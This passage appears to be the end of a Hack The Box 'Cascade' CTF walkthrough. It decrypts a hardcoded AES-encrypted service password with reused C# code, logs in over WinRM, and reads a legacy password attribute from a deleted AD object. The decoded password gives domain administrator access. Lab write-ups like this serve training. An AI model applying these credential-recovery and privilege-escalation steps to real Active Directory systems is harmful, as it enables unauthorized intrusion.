We can then get the decryption function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">public static string DecryptString<span style="color:#f92672">(</span>string EncryptedString, string Key<span style="color:#f92672">)</span>
    <span style="color:#f92672">{</span>
      byte<span style="color:#f92672">[]</span> array <span style="color:#f92672">=</span> Convert.FromBase64String<span style="color:#f92672">(</span>EncryptedString<span style="color:#f92672">)</span>;
      Aes aes <span style="color:#f92672">=</span> Aes.Create<span style="color:#f92672">()</span>;
      aes.KeySize <span style="color:#f92672">=</span> 128;
      aes.BlockSize <span style="color:#f92672">=</span> 128;
      aes.IV <span style="color:#f92672">=</span> Encoding.UTF8.GetBytes<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;1tdyjCbY1Ix49842&#34;</span><span style="color:#f92672">)</span>;
      aes.Mode <span style="color:#f92672">=</span> CipherMode.CBC;
      aes.Key <span style="color:#f92672">=</span> Encoding.UTF8.GetBytes<span style="color:#f92672">(</span>Key<span style="color:#f92672">)</span>;
      string @string;
      using <span style="color:#f92672">(</span>MemoryStream memoryStream <span style="color:#f92672">=</span> new MemoryStream<span style="color:#f92672">(</span>array<span style="color:#f92672">))</span>
      <span style="color:#f92672">{</span>
        using <span style="color:#f92672">(</span>CryptoStream cryptoStream <span style="color:#f92672">=</span> new CryptoStream<span style="color:#f92672">(</span>memoryStream, aes.CreateDecryptor<span style="color:#f92672">()</span>, CryptoStreamMode.Read<span style="color:#f92672">))</span>
        <span style="color:#f92672">{</span>
          byte<span style="color:#f92672">[]</span> array2 <span style="color:#f92672">=</span> new byte<span style="color:#f92672">[</span>checked<span style="color:#f92672">(</span>array.Length - <span style="color:#ae81ff">1</span> + 1<span style="color:#f92672">)]</span>;
          cryptoStream.Read<span style="color:#f92672">(</span>array2, 0, array2.Length<span style="color:#f92672">)</span>;
          @string <span style="color:#f92672">=</span> Encoding.UTF8.GetString<span style="color:#f92672">(</span>array2<span style="color:#f92672">)</span>;
        <span style="color:#f92672">}</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">return</span> @string;
    <span style="color:#f92672">}</span>
</code></pre></div><p>We are therefore able to decrypt our password, by slightly manipulating the code!
Being a noob, I didn&rsquo;t try to patch the binary (And above all, I was lazy and I knew another method).</p>
<p>In the same way as for the <code>Nest</code> machine, the <a href="https://dotnetfiddle.net">https://dotnetfiddle.net</a> website is going to be a great help!
We simply integrate the decryption function in a small program and display the value of the decrypted password</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
          
public class Program
<span style="color:#f92672">{</span>
  public static void Main<span style="color:#f92672">()</span>
  <span style="color:#f92672">{</span>
    Console.WriteLine<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello World&#34;</span><span style="color:#f92672">)</span>;
    Console.WriteLine<span style="color:#f92672">(</span>DecryptString<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;BQO5l5Kj9MdErXx6Q6AGOw==&#34;</span>, <span style="color:#e6db74">&#34;c4scadek3y654321&#34;</span><span style="color:#f92672">))</span>;
  <span style="color:#f92672">}</span>
  public static string DecryptString<span style="color:#f92672">(</span>string EncryptedString, string Key<span style="color:#f92672">)</span>
    <span style="color:#f92672">{</span>
      byte<span style="color:#f92672">[]</span> array <span style="color:#f92672">=</span> Convert.FromBase64String<span style="color:#f92672">(</span>EncryptedString<span style="color:#f92672">)</span>;
      Aes aes <span style="color:#f92672">=</span> Aes.Create<span style="color:#f92672">()</span>;
      aes.KeySize <span style="color:#f92672">=</span> 128;
      aes.BlockSize <span style="color:#f92672">=</span> 128;
      aes.IV <span style="color:#f92672">=</span> Encoding.UTF8.GetBytes<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;1tdyjCbY1Ix49842&#34;</span><span style="color:#f92672">)</span>;
      aes.Mode <span style="color:#f92672">=</span> CipherMode.CBC;
      aes.Key <span style="color:#f92672">=</span> Encoding.UTF8.GetBytes<span style="color:#f92672">(</span>Key<span style="color:#f92672">)</span>;
      string @string;
      using <span style="color:#f92672">(</span>MemoryStream memoryStream <span style="color:#f92672">=</span> new MemoryStream<span style="color:#f92672">(</span>array<span style="color:#f92672">))</span>
      <span style="color:#f92672">{</span>
        using <span style="color:#f92672">(</span>CryptoStream cryptoStream <span style="color:#f92672">=</span> new CryptoStream<span style="color:#f92672">(</span>memoryStream, aes.CreateDecryptor<span style="color:#f92672">()</span>, CryptoStreamMode.Read<span style="color:#f92672">))</span>
        <span style="color:#f92672">{</span>
          byte<span style="color:#f92672">[]</span> array2 <span style="color:#f92672">=</span> new byte<span style="color:#f92672">[</span>checked<span style="color:#f92672">(</span>array.Length - <span style="color:#ae81ff">1</span> + 1<span style="color:#f92672">)]</span>;
          cryptoStream.Read<span style="color:#f92672">(</span>array2, 0, array2.Length<span style="color:#f92672">)</span>;
          @string <span style="color:#f92672">=</span> Encoding.UTF8.GetString<span style="color:#f92672">(</span>array2<span style="color:#f92672">)</span>;
        <span style="color:#f92672">}</span>
      <span style="color:#f92672">}</span>
      <span style="color:#66d9ef">return</span> @string;
    <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
</code></pre></div><p>And then, the result !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Hello World
w3lc0meFr31nd
</code></pre></div><br/>
<h3 id="privilege-escalation-through-arksvc">Privilege escalation through <code>ArkSvc</code></h3>
<p><code>ArkSvc</code> also being member of the <code>Remote Management Users</code>group, wen can use it to connect through WinRM.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell_arksvc.rb 
PS &gt; whoami 
cascade<span style="color:#ae81ff">\a</span>rksvc
PS &gt; pwd

Path                     
----                     
C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>rksvc<span style="color:#ae81ff">\D</span>ocuments
</code></pre></div><p>From there, the privilege escalation is quite simple. Looking at all the elements already seen and the information retrieved during the enumeration phase, we know that the <code>ArkSvc</code> user controls the service used for audit and domain account deletion (<code>Recycle Bin</code>).</p>
<p>Some research on the Internet teaches that when the <code>Recycle Bin</code> service is activated, it is possible to restore deleted objects. But it is also possible to recover information associated with deleted objects. The following resource (<a href="https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html">https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html</a>) gives all the necessary information.</p>
<p>Thus, the following command displays the deleted objects.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS &gt; Get-ADObject -Filter <span style="color:#f92672">{</span>SamAccountName -eq <span style="color:#e6db74">&#39;TempAdmin&#39;</span><span style="color:#f92672">}</span> -IncludeDeletedObjects -Properties *


accountExpires                  : <span style="color:#ae81ff">9223372036854775807</span>
badPasswordTime                 : <span style="color:#ae81ff">0</span>
badPwdCount                     : <span style="color:#ae81ff">0</span>
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : <span style="color:#ae81ff">0</span>
countryCode                     : <span style="color:#ae81ff">0</span>
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     : 
DisplayName                     : TempAdmin
DistinguishedName               : CN<span style="color:#f92672">=</span>TempAdmin<span style="color:#ae81ff">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span style="color:#f92672">=</span>Deleted Objects,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
dSCorePropagationData           : <span style="color:#f92672">{</span>1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM<span style="color:#f92672">}</span>
givenName                       : TempAdmin
instanceType                    : <span style="color:#ae81ff">4</span>
isDeleted                       : True
LastKnownParent                 : OU<span style="color:#f92672">=</span>Users,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
lastLogoff                      : <span style="color:#ae81ff">0</span>
lastLogon                       : <span style="color:#ae81ff">0</span>
logonCount                      : <span style="color:#ae81ff">0</span>
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  : 
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : <span style="color:#ae81ff">513</span>
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : <span style="color:#ae81ff">132245689883479503</span>
sAMAccountName                  : TempAdmin
sDRightsEffective               : <span style="color:#ae81ff">0</span>
userAccountControl              : <span style="color:#ae81ff">66048</span>
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : <span style="color:#ae81ff">237705</span>
uSNCreated                      : <span style="color:#ae81ff">237695</span>
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
</code></pre></div><p>Did you see it ? ;)
AS for the first user, a <code>cascadeLegacyPwd</code> is defined for <code>TempAdmin</code>. The password can also be gathered.
L&rsquo;avez vous vu ? ;)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;YmFDVDNyMWFOMDBkbGVz&#34;</span> | base64 -d 
baCT3r1aN00dles%                                        
</code></pre></div><p>And.. Compromised ! Huh ?
Remember, the HTML note to the internal IT group specifying that the temporary account had the same password as the administrator account&hellip;
Well, we then modify the ruby script to include the password, and log in with the <code>administrator</code> account.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell_admin.rb 
PS &gt; hostname
CASC-DC1
PS &gt; whoami
cascade<span style="color:#ae81ff">\a</span>dministrator
</code></pre></div><p>w00ted !</p>
  </div>
  

<div class="post--navigation post--navigation-single">
    
    <a href="/en/walkthroughs/hackthebox/sauna/" class="post--navigation-prev">
      <i aria-hidden="true" class="fa fa-chevron-left"></i>
      <span class="navigation-tittle">Hack The Box - Sauna</span>
    </a>
    
    
    <a href="/en/walkthroughs/hackthebox/remote/" class="post--navigation-next">
      <span class="navigation-tittle">Hack The Box - Remote</span>
      <i aria-hidden="true" class="fa fa-chevron-right"></i>
    </a>
    
</div>


  

  
    


</article>


        </div>
        
    
  
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'G-GB7QC0EDF8', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>


<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
  crossorigin="anonymous">
</script>


    
        
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
        
        <script type="text/javascript">
            hljs.configure({languages: []});
            hljs.initHighlightingOnLoad();
        </script>
        
        



    



    </body>
</html>
